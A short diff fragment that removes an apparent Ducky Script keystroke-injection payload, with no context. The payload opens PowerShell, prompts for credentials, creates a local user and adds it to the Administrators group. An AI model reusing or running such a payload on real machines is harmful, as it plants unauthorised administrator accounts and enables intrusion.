@@ -1,5 +1,0 @@
-STRING powershell
-ENTER
-DELAY 500
-STRING $user=Read-Host "Enter username"; $pass=Read-Host "Enter password"; net user $user $pass /add; net localgroup Administrators $user /add
-ENTER
